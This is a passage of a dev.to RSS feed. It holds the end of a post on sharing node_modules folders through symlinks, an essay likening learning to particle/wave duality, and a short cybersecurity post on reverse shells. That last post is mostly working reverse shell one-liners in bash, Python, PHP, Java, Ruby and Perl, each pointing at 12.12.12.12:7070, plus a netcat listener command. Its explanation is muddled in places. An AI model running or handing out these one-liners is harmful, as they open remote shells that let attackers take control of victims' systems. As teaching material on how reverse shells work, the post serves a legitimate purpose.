&lt;li&gt;&lt;a href="https://docs.npmjs.com/cli/v7/configuring-npm/folders#node-modules"&gt;NPM Folder Structures | NPM Docs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.npmjs.com/about-packages-and-modules#about-modules"&gt;NPM Packages and Modules | NPM Docs&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;




&lt;p&gt;When learning a new technology, I prefer to make multiple small projects focused on different concepts as opposed to cramming everything into one giga app.&lt;/p&gt;

&lt;p&gt;I come from an Angular background where it's possible to create multiple projects using a single, root &lt;code&gt;package.json&lt;/code&gt;; a single &lt;em&gt;node_modules&lt;/em&gt; folder is shared across all the various projects under that Angular app.&lt;/p&gt;

&lt;p&gt;A few days ago, I renewed my efforts to learn React and immediately ran into a major hurdle... the &lt;em&gt;node_modules&lt;/em&gt; folder, or rather a growing hydra of &lt;em&gt;node_modules&lt;/em&gt; folders.&lt;/p&gt;

&lt;p&gt;Every time I created an app with 'create-react-app' (CRA), a new dependency folder appeared.&lt;/p&gt;




&lt;h2&gt;
  &lt;a href="#why-is-having-multiple-nodemodules-a-problem"&gt;
  &lt;/a&gt;
  Why is having multiple node_modules a problem?
&lt;/h2&gt;

&lt;p&gt;For a Hello World React app with only the core dependencies, i.e. react, react-dom, and react-scripts, the &lt;em&gt;node_modules&lt;/em&gt; folder is 218 MB on disk. Now the size doesn't sound too bad, but in this directory are 5,300 folders and 35,000 files. WHY?!?! Am I building an OS here?&lt;/p&gt;

&lt;p&gt;This exorbitant amount is for the most basic of apps w/ no other dependencies. It climbs even higher on adding other deps, e.g. w/ Tailwind CSS, 363 MB on disk across 6,100 folders!&lt;/p&gt;

&lt;p&gt;You want me to copy or redownload 40,200 files spread across 6,100 folders in order to compile and serve EVERY SINGLE Tailwind React app I create?!&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;I say not! ヽ(ಠ_ಠ)ノ&lt;/p&gt;
&lt;/blockquote&gt;




&lt;h2&gt;
  &lt;a href="#the-investigation"&gt;
  &lt;/a&gt;
  The Investigation
&lt;/h2&gt;

&lt;p&gt;On examination, the source code of this Hello World app is only 18 files across 2 folders for a total of 700 KB.&lt;/p&gt;

&lt;p&gt;That means the size of the app directory is a problem specific to how dependencies are handled in Node.js.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;What if we could reuse a &lt;em&gt;node_modules&lt;/em&gt; folder across multiple projects?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;After some research, I found that when using &lt;code&gt;require()&lt;/code&gt;, Node.js will look into the &lt;em&gt;node_modules&lt;/em&gt; of parent folders if the module isn't found in the root &lt;em&gt;node_modules&lt;/em&gt; of the project. While useful, it doesn't solve the problem of serving the compiled app.&lt;/p&gt;




&lt;h2&gt;
  &lt;a href="#the-solution-symbolic-links"&gt;
  &lt;/a&gt;
  The Solution – Symbolic Links
&lt;/h2&gt;

&lt;p&gt;I looked a little deeper and found my solution at the OS level.&lt;/p&gt;

&lt;p&gt;Windows and Linux both have a concept called &lt;strong&gt;symbolic links (symlinking)&lt;/strong&gt;, which you can think of as a local reference/pointer to a file or directory elsewhere on the system.&lt;/p&gt;

&lt;p&gt;The benefit of symlinking is that the link looks and acts like the real file/directory, but takes up no extra storage! And of course, the symlink is set up instantaneously as there's no copying to be done.&lt;/p&gt;

&lt;p&gt;Give you any ideas? Yes, exactly! We can create a single &lt;em&gt;node_modules&lt;/em&gt; dir containing the dependencies for all our React apps, and use symlinking inside of each app to reference this 'root' &lt;em&gt;node_modules&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Luckily, it worked just as expected. Now instead of 10 React apps costing my hard drive 4 GB, 61,000 folders, and 402,000 files, I need only 10% of that storage. The savings only grow as I add more apps!&lt;/p&gt;

&lt;p&gt;Further, by copying only a set of 18 Hello World files, I also save a few minutes on each new React app I create.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Imagine 100 React apps without symlinking... 4 million files! 😬&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I've left resources on the implementation of symlinking below. The terminal commands are as follows:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;mklink (Windows)&lt;/li&gt;
&lt;li&gt;ln (Linux)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;You can also reference &lt;code&gt;Configuration.md&lt;/code&gt; in my React repo for an example implementation.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://github.com/Ryo112358/react-playground"&gt;Ryo112358/react-playground&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now get Symlinking, your computer will thank you!&lt;/p&gt;

&lt;p&gt;Until Next Time,&lt;br&gt;
Pulkit&lt;/p&gt;




&lt;p&gt;P.S. Shout-out to my girlfriend (&lt;a href="https://dev.to/laulina"&gt;@laulina&lt;/a&gt;) for the title idea ^.^&lt;/p&gt;




&lt;h3&gt;
  &lt;a href="#references"&gt;
  &lt;/a&gt;
  References:
&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href="https://linuxize.com/post/how-to-create-symbolic-links-in-linux-using-the-ln-command/"&gt;Ln Command | Linuxize&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mklink"&gt;Mklink Command | Microsoft Docs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://nodejs.org/api/modules.html#modules_loading_from_node_modules_folders"&gt;Loading modules from the 'node_modules' folder | Node.js Docs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/29786887/how-can-i-make-multiple-projects-share-node-modules-directory"&gt;How can I make multiple projects share 'node_modules' directory?&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h3&gt;
  &lt;a href="#further-reading"&gt;
  &lt;/a&gt;
  Further Reading:
&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href="https://lodash.com/"&gt;Lodash Library&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://hackernoon.com/whats-really-wrong-with-node-modules-and-why-this-is-your-fault-8ac9fa893823"&gt;What's really wrong with 'node_modules' | Hacker Noon&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.howtogeek.com/howto/16226/complete-guide-to-symbolic-links-symlinks-on-windows-or-linux/"&gt;The Complete Guide to Symbolic Links&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;




&lt;h3&gt;
  &lt;a href="#published-on-medium"&gt;
  &lt;/a&gt;
  Published on Medium
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://coffeelessprogrammer.medium.com/2-birds-1-stone-10-apps-1-node-3f9a8dabad87?source=friends_link&amp;amp;sk=f797d27af1c7b5b57d04bfc1f0770669"&gt;A Better Way to Node_Modules | CoffeelessProgrammer | Medium&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
      <category>coffeelessthoughts</category>
      <category>todayilearned</category>
      <category>node</category>
      <category>react</category>
    </item>
    <item>
      <title>The Particle/Wave Duality Theory of Knowledge</title>
      <author>swyx</author>
      <pubDate>Fri, 25 Jun 2021 20:29:35 +0000</pubDate>
      <link>https://dev.to/swyx/the-particle-wave-duality-theory-of-knowledge-41g6</link>
      <guid>https://dev.to/swyx/the-particle-wave-duality-theory-of-knowledge-41g6</guid>
      <description>&lt;p&gt;I've come to regard learning — the accumulation of knowledge — as &lt;em&gt;simultaneously&lt;/em&gt; a discrete &lt;em&gt;and&lt;/em&gt; a continuous process. &lt;/p&gt;

&lt;p&gt;If the tools we use don't respect this duality, information is lost — either writing involves too much effort, or reading requires too much context. This has implications both for people who want to learn better, as well as content creators who want to transfer knowledge better.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#discrete-vs-continuous-learning"&gt;
  &lt;/a&gt;
  Discrete vs Continuous Learning
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Books, courses, and wikis&lt;/strong&gt; are prime examples of &lt;strong&gt;discrete&lt;/strong&gt; learning. &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The ideal wiki article is a complete introduction, history, and overview of a particular topic. Its value comes from being a reliable aggregate source of truth. The structure and sequencing of knowledge presented is often as valuable as the content itself.&lt;/li&gt;
&lt;li&gt;However, long books, courses, and wikis are a lot of content to consume all at once and may never be finished. The scope may be so large that it is hard to keep up to date, particularly when the &lt;em&gt;structure&lt;/em&gt; itself needs to change with the times.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Twitter, Discord, and Email Newsletters&lt;/strong&gt; offer modes of &lt;strong&gt;continuous&lt;/strong&gt; learning.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The focus is on new content, and lack of structure allows maximum flexibility. Information is also bitesize and thus very consumable. Because of the realtime/live nature and randomness of quality, there is inbuilt variable reward which keeps us as addicted as BF Skinner's pigeons.&lt;/li&gt;
&lt;li&gt;However, the lack of historical context can leave beginners out of the loop, and even experts can fall prey to &lt;a href="https://thedecisionlab.com/biases/base-rate-fallacy/"&gt;base rate neglect&lt;/a&gt;. News also has limited long term expected value due to the Lindy Effect, and therefore have a much lower signal to noise ratio. Finally, since major developments tend to spread out over time, there is often no one canonical link that you can send people to get up to speed — you "just had to be there".&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I've only mentioned examples familiar to individual learners, but this duality also exists at a company level. Do you put all your company knowledge in Notion/Sharepoint (discrete) or Slack (continuous)? Do your docs offer a complete learning path (discrete) or do people also have to read your blog and support forums (continuous)?&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#particlewave-duality"&gt;
  &lt;/a&gt;
  Particle/Wave Duality
&lt;/h2&gt;

&lt;p&gt;I've already given away the analogy in the title, but this situation reminds me of the dual-slit experiment of quantum mechanics. Here's a quick one minute explainer:&lt;/p&gt;

&lt;p&gt;&lt;iframe width="710" height="399" src="https://www.youtube.com/embed/Q_h4IoPJXZw"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;Perhaps you're most familiar with this in the double split experiment:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--biKEcbHX--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2jncajmthzjihsfmmst3.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--biKEcbHX--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2jncajmthzjihsfmmst3.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I'm no expert myself but the version that works best for the analogy I'm going for sums it up like this:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;As the light/electron beam is in transit, it acts like a wave.&lt;/li&gt;
&lt;li&gt;As the light/electron beam is "observed"/hits the screen, it acts like a particle.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This all has very nice parallels to the process of learning. Sometimes we are picking up knowledge in a continuous stream, sometimes we just want a big quantum of knowledge all at once. The best forms of learning combine the two modes:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;If you learn in a continuous stream, it is useful to recap everything you learned in a post-mortem or retrospective. If you've gained a few years of experience, it's helpful to write down &lt;a href="https://www.notion.so/5bb2d99e50fdbbd15dd9622837d14e2b"&gt;Things You Believe&lt;/a&gt; or write up the guide you wish you'd had.&lt;/li&gt;
&lt;li&gt;If you learned in a discrete block, it is useful to continue that education with continuous &lt;a href="https://ncase.me/remember/"&gt;spaced repetition&lt;/a&gt; or involvement in an alumni community (many professions from finance to airline pilots even require this as "Continuing Education"!)&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#the-particlewave-duality-theory-of-knowledge"&gt;
  &lt;/a&gt;
  The Particle/Wave Duality Theory of Knowledge
&lt;/h2&gt;

&lt;p&gt;The Particle/Wave Duality Theory of Knowledge defines learning — the accumulation of knowledge — as &lt;em&gt;simultaneously&lt;/em&gt; a discrete &lt;em&gt;and&lt;/em&gt; a continuous process. There's no point picking a side. We learn best with both, so if you are a content creator or knowledge worker, you need a way to record both. &lt;/p&gt;

&lt;p&gt;If knowledge tools don't respect this duality, users will be forced to do the work of duplicating knowledge, or lose it forever.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#paying-the-duality-cost"&gt;
  &lt;/a&gt;
  Paying the Duality Cost
&lt;/h2&gt;

&lt;p&gt;I'll motivate this with a personal example. I run &lt;a href="https://www.learninpublic.org/"&gt;the Coding Career Community&lt;/a&gt; in &lt;em&gt;two&lt;/em&gt; places - &lt;a href="http://circle.so"&gt;Circle.so&lt;/a&gt; for my async knowledge base (discrete), and Discord for my live chat (continuous). Of course, both are more continuous places of engagement compared to the book they are focused on, which is the most discrete item of all in my hierarchy (discrete-ness is a spectrum!)&lt;/p&gt;

&lt;p&gt;People might think me crazy for splitting my efforts in running &lt;em&gt;two&lt;/em&gt; communities, instead of one. But I get active users in both and they rarely overlap: &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;My Circle members are nominally bigger, but far less active and conversations can drag out over days. The primary means of engagement is by the weekly Thursday recap newsletter that gets automatically sent out.&lt;/li&gt;
&lt;li&gt;My Discord members are fewer, but more active and respond quickly to new posts. The primary means of engagement is in-app notifications, banking on the network effect of my members already being active in other Discords.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;You can analyze this split in every dimension and still come up 50-50. Think about the new user experience, a critical moment for every community. &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;A Discord user can say hi and immediately get the dopamine hit of a hi back. But they're not going to scroll up and read through the best hits of the community (pinning isn't very effective), so what they see is just completely randomly whatever is the topic of conversation that day.&lt;/li&gt;
&lt;li&gt;A Circle user doesn't even have to say hi, but can get immense value from the top/pinned post and become a fan right then. So I can pour in all my effort to make that top notch.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;There's no clear cut right answer. Some users will prefer one extreme, some the other, and yet more will just want both. Yet I need to keep both up to date. What I do right now is peak do-things-that-don't-scale: I post continuous updates to Discord, and then once a week I sum up the best of what I find and &lt;a href="https://codingcareer.circle.so/c/learn-in-public"&gt;manually cross-post it to Circle&lt;/a&gt;. Sometimes I find the occasional quality post on Circle, so I send it back to Discord (for sharing with the Discord natives), and to Twitter (for marketing).&lt;/p&gt;

&lt;p&gt;So I'm paying the expensive cost of Particle/Wave Duality, because my tools currently don't recognize it. I could make a bot to do the two way sync between Discord and Circle, but what I'd really like is for this to just be built in in some way. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#database-solutions"&gt;
  &lt;/a&gt;
  Database Solutions
&lt;/h2&gt;

&lt;p&gt;If you are developer-literate, I also think there are a couple alternative analogies you can use to solve this dual need:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;a href="https://en.wikipedia.org/wiki/Change_data_capture"&gt;&lt;strong&gt;Change Data Capture&lt;/strong&gt;&lt;/a&gt; (discrete → continuous): When you update a row in a database, there can be inbuilt functionality to send a notification of what changed (eg &lt;a href="https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/kds.html"&gt;DynamoDB with Kinesis Data Streams&lt;/a&gt;). So people can read up a discrete state of information, then subscribe to the diffs. This is exactly how I use Notion at work, where I rely on email updates of diffs since it is impossible for me to stay on top of all the changes my coworkers are making by checking through each document individually.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://en.wikipedia.org/wiki/Materialized_view"&gt;Materialized Views&lt;/a&gt; (&lt;/strong&gt;continuous → discrete*&lt;em&gt;)&lt;/em&gt;*: As you add, modify, or delete data, a separate "materialized view" auto updates and can always be referenced as the source of truth on all the changes that have happened to date. This is how Kanban boards and issue trackers work, by presenting a top down view of the status of work items moving through the engineering process.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;What would Change Data Capture and Materialized Views look like for knowledge management tools, say a Second Brain, or a Blog?&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#applying-theory-to-creation"&gt;
  &lt;/a&gt;
  Applying Theory to Creation
&lt;/h2&gt;

&lt;p&gt;Ultimately I think a lot about this in terms of the context of writing and other forms of content creation. As much as I've been talking about the preferred content consumption angle, the stakes are even higher for content creation:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Discrete knowledge items like books and courses are most useful to learners because they present a comprehensive overview. However if it is such a big lift, it may never get done and you may be doing your learners a disservice by not contributing your voice.

&lt;ul&gt;
&lt;li&gt;By the way, many people also treat blogposts like discrete items, taking months to draft it and to have it peer-reviewed like an academic journal. This is usually unsustainable and the blogging grinds to a halt, killed by its own process.&lt;/li&gt;
&lt;/ul&gt;


&lt;/li&gt;
&lt;li&gt;Continuous knowledge items like tweets and chat conversations are far more digestible and easier to create. However, small low effort items out of context aren't all that valuable in themselves, and struggle to stand out and get traction compared to &lt;a href="https://sparktoro.com/blog/resources/10x-content-by-rand-fishkin/"&gt;10x Content&lt;/a&gt; that sells itself.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ultimately I think you should try to do both. Prototype by making continuous knowledge items, but be aware that most people will never see your work there. So periodically you need to do "treasure collection" - go back through your continuous streams, and pick out the most promising threads to turn into bigger, discrete pieces.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#question-from-a-reader"&gt;
  &lt;/a&gt;
  Question from a Reader
&lt;/h2&gt;

&lt;p&gt;"&lt;em&gt;Our team currently has years of docs in a Google docs like system. Main problem with new hires is that they haven't yet accepted that the docs are poorly maintained, or there are 6 docs for the same process written by different people and not deleted or updated. It's madness. How would you go about this process?&lt;/em&gt;"&lt;/p&gt;

&lt;p&gt;Ah, the outdated knowledge base problem. We continually swing back and forth between wanting a discrete source of truth, but then time passes and continuous updates do not get registered. Technology hasn't (yet) solved this — although graph database tooling like &lt;a href="https://roamresearch.com/"&gt;Roam Research&lt;/a&gt; or &lt;a href="https://obsidian.md/"&gt;Obsidian&lt;/a&gt; can automatically propagate continuous updates to discrete materialized views, it is still a poor susbstitute for properly curated and updated structure. &lt;/p&gt;

&lt;p&gt;Ultimately I view the knowledge base problem as a human problem - you have to commit to maintaining your sources of truth, but don't make it so huge as to be unmaintainable and unreadable. Don't be so rigid about your process that you treat people talking to each other to figure out problems as a bug. Identify what you care about and make it a priority to enforce that, but recognize that enforcement isn't free and pick your battles.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Major thanks to &lt;a href="https://xdg.me/"&gt;David Golden&lt;/a&gt;, &lt;a href="https://twitter.com/_mjmeyer?lang=en"&gt;MJ Meyer&lt;/a&gt;, and &lt;a href="https://calvintorra.com/"&gt;Calvin Torra&lt;/a&gt; for providing feedback on drafts!&lt;/em&gt;&lt;/p&gt;

</description>
      <category>learning</category>
      <category>reflections</category>
    </item>
    <item>
      <title>[Cybersecurity] How do Reverse shells work?</title>
      <author>Yuma-Tsushima </author>
      <pubDate>Fri, 25 Jun 2021 20:24:24 +0000</pubDate>
      <link>https://dev.to/yumatsushima07/cybersecurity-how-do-reverse-shells-work-1jfc</link>
      <guid>https://dev.to/yumatsushima07/cybersecurity-how-do-reverse-shells-work-1jfc</guid>
      <description>&lt;h1&gt;
  &lt;a href="#reverse-shells"&gt;
  &lt;/a&gt;
  Reverse Shells
&lt;/h1&gt;

&lt;h2&gt;
  &lt;a href="#how-do-reverse-shells-work"&gt;
  &lt;/a&gt;
  How do reverse shells work?
&lt;/h2&gt;

&lt;p&gt;To make a connection to a typical remote shell, a machine controlled by the attacker connects to the remote network host and it requests a shell connection.&lt;br&gt;
This is called a &lt;code&gt;blind shell&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;But what if the remote host is not directly accessible, like it has public IP or is protected by a firewall?&lt;/p&gt;

&lt;p&gt;In this situation reverse shells maybe shouldn't be used, where the target machine initiates connection to the listening network host a shell is now established.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#reverse-shells-examples"&gt;
  &lt;/a&gt;
  Reverse Shells Examples
&lt;/h2&gt;

&lt;p&gt;To start you need a listener process on their system to listen the reverse shell connections incoming to their IP address, Eg, &lt;code&gt;12.12.12.12&lt;/code&gt;&lt;br&gt;
On Linux, this can be as simple as one netcat command.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;nc -lvnp 7070
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;


&lt;p&gt;The netcat listener will listen at port &lt;code&gt;7070&lt;/code&gt;. An attacker needs to execute the code to the listener. Many reverse shells needs programming langs&lt;br&gt;
and systems. &lt;br&gt;
Check out &lt;a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"&gt;pentestmonkey’s Reverse Shell Cheat Sheet&lt;/a&gt; for more.&lt;br&gt;
Codes are typically one-liners to allow injection using a single command. &lt;br&gt;
While the examples below are for Linux and other Unix-like systems, many of them will also work on Windows if you change the command line interpreter call from &lt;code&gt;/bin/sh -i&lt;/code&gt; to &lt;code&gt;cmd.exe&lt;/code&gt;.&lt;/p&gt;
&lt;h3&gt;
  &lt;a href="#bash-reverse-shell"&gt;
  &lt;/a&gt;
  Bash Reverse Shell
&lt;/h3&gt;

&lt;p&gt;If the target machine runs Linux, it’s a good idea to start with bash, as nearly all Linux systems come with this system shell:&lt;br&gt;
&lt;/p&gt;
&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;/bin/bash &lt;span class="nt"&gt;-i&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/12.12.12.12/7070 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

&lt;h3&gt;
  &lt;a href="#python-reverse-shell"&gt;
  &lt;/a&gt;
  Python Reverse Shell
&lt;/h3&gt;

&lt;p&gt;With Python continuing to gain popularity, there’s a good chance it’s available on the target server and can be used to execute a script like:&lt;br&gt;
&lt;/p&gt;
&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s"&gt;'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("12.12.12.12",7070));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

&lt;h3&gt;
  &lt;a href="#php-reverse-shell"&gt;
  &lt;/a&gt;
  PHP Reverse Shell
&lt;/h3&gt;

&lt;p&gt;Most web servers will have PHP installed, and this too can provide a reverse shell vector (if the file descriptor &amp;amp;3 doesn’t work, you can try subsequent numbers):&lt;br&gt;
&lt;/p&gt;
&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="n"&gt;php&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="s1"&gt;'$sock=fsockopen("12.12.12.12",7070);exec("/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3");'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

&lt;h3&gt;
  &lt;a href="#java-reverse-shell"&gt;
  &lt;/a&gt;
  Java Reverse Shell
&lt;/h3&gt;

&lt;p&gt;Java is likely to be available on application servers:&lt;br&gt;
&lt;/p&gt;
&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight java"&gt;&lt;code&gt;&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nc"&gt;Runtime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getRuntime&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;exec&lt;/span&gt;&lt;span class="o"&gt;([&lt;/span&gt;&lt;span class="s"&gt;"/bin/bash"&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="s"&gt;"-c"&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="s"&gt;"exec 5&amp;lt;&amp;gt;/dev/tcp/12.12.12.12/7070;cat &amp;lt;&amp;amp;5 | while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done"&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="n"&gt;as&lt;/span&gt; &lt;span class="nc"&gt;String&lt;/span&gt;&lt;span class="o"&gt;[])&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;waitFor&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

&lt;h3&gt;
  &lt;a href="#ruby-reverse-shell"&gt;
  &lt;/a&gt;
  Ruby Reverse Shell
&lt;/h3&gt;

&lt;p&gt;Ruby is another popular web application language that’s likely to have an interpreter on a general-purpose server system:&lt;br&gt;
&lt;/p&gt;
&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight ruby"&gt;&lt;code&gt;&lt;span class="n"&gt;ruby&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rsocket&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="s1"&gt;'f=TCPSocket.open("12.12.12.12",7070).to_i;exec sprintf("/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d",f,f,f)'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

&lt;h3&gt;
  &lt;a href="#perl-reverse-shell"&gt;
  &lt;/a&gt;
  Perl Reverse Shell
&lt;/h3&gt;

&lt;p&gt;As with bash, a perl interpreter should be available on most Linux servers, so a perl command might be another way to obtain a reverse shell:&lt;br&gt;
&lt;/p&gt;
&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight perl"&gt;&lt;code&gt;&lt;span class="nv"&gt;perl&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;e&lt;/span&gt; &lt;span class="p"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;use Socket;$i="12.12.12.12";$p=7070;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&amp;gt;&amp;amp;S");open(STDOUT,"&amp;gt;&amp;amp;S");open(STDERR,"&amp;gt;&amp;amp;S");exec("/bin/sh -i");};&lt;/span&gt;&lt;span class="p"&gt;'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

&lt;h2&gt;
  &lt;a href="#check-out-my-gist-here"&gt;
  &lt;/a&gt;
  Check out my Gist Here
&lt;/h2&gt;


&lt;div class="ltag_gist-liquid-tag"&gt;
  
&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#credits"&gt;
  &lt;/a&gt;
  Credits
&lt;/h2&gt;


&lt;div class="ltag-github-readme-tag"&gt;
  &lt;div class="readme-overview"&gt;
    &lt;h2&gt;
      &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--i3JOwpme--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/github-logo-ba8488d21cd8ee1fee097b8410db9deaa41d0ca30b004c0c63de0a479114156f.svg" alt="GitHub logo"&gt;
      &lt;a href="https://github.com/Yuma-Tsushima07"&gt;
        Yuma-Tsushima07
      &lt;/a&gt; / &lt;a href="https://github.com/Yuma-Tsushima07/Yuma-Tsushima07"&gt;
        Yuma-Tsushima07
      &lt;/a&gt;
    &lt;/h2&gt;
    &lt;h3&gt;
      Readme file
    &lt;/h3&gt;
  &lt;/div&gt;
  &lt;div class="ltag-github-body"&gt;
    
&lt;div id="readme" class="md"&gt;
      &lt;h1&gt;
Welcome to Yuma-Tsushima's Github page!&lt;/h1&gt;
  &lt;p&gt;
  &lt;b&gt;Visitor count &lt;/b&gt;&lt;br&gt;
  &lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/57a70d5f50ac5d203e9b6bd912fc9e4b01c8d40c215b656821b455d1f18f928f/68747470733a2f2f70726f66696c652d636f756e7465722e676c697463682e6d652f59756d612d5473757368696d6130372f636f756e742e737667"&gt;&lt;img src="https://camo.githubusercontent.com/57a70d5f50ac5d203e9b6bd912fc9e4b01c8d40c215b656821b455d1f18f928f/68747470733a2f2f70726f66696c652d636f756e7465722e676c697463682e6d652f59756d612d5473757368696d6130372f636f756e742e737667"&gt;&lt;/a&gt;
&lt;/p&gt;

